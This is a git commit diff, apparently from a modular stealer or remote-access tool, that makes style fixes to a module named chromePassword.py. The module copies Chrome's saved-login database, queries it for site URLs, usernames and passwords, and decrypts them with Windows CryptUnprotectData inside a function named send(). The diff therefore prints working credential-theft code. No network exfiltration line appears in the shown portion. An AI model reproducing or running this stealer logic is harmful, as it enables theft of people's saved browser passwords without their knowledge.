80617d7b92da9cc90037c10996d506c746e053e8
Shou C <shouchaofan@shphschool.com>
2018-10-19 22:24:31 +0800

    Code style fix
    Get to sleep then

--- module/browsers/chromePassword.py
+++ module/browsers/chromePassword.py
@@ -3,17 +3,17 @@ __name__ = "chromePassword"
 __desc__ = "Retrieve all saved password of Google Chrome"
 def send():
     import os, sqlite3, win32crypt, shutil
-    sourceFileWithLogin = '%s\Google\Chrome\User Data\Profile 1\Login Data' % os.getenv('localappdata')
-    sourceFileWithoutLogin = '%s\Google\Chrome\User Data\Default\Login Data' % os.getenv('localappdata')
+    sourceFileWithLogin = "%s\Google\Chrome\User Data\Profile 1\Login Data" % os.getenv("localappdata")
+    sourceFileWithoutLogin = "%s\Google\Chrome\User Data\Default\Login Data" % os.getenv("localappdata")
     def get(sourceFile):
-        targetFile = '%s\TempData_C' % os.getenv('localappdata')
+        targetFile = "%s\TempData_C" % os.getenv("localappdata")
         result = "<Username>:<Password> (Site)\n"
         shutil.copy(sourceFile, targetFile)
         connection = sqlite3.connect(targetFile)
         with connection:
             cursor = connection.cursor()
             vGen = cursor.execute(
-                'SELECT action_url, username_value, password_value FROM logins')
+                "SELECT action_url, username_value, password_value FROM logins")
             dataValue = vGen.fetchall()
         for originURL, username, password in dataValue:
             passwordDecrypted = win32crypt.CryptUnprotectData(
@@ -28,7 +28,7 @@ def send():
         os.path.exists(sourceFileWithLogin):
         return get(sourceFileWithLogin)
     else:
-        if os.path.exists(sourceFileWithoutLogin) and\
+        if os.path.exists(sourceFileWithoutLogin) and \
             not len(open(sourceFileWithoutLogin).readlines()) == 0:
             return get(sourceFileWithoutLogin)
         else:
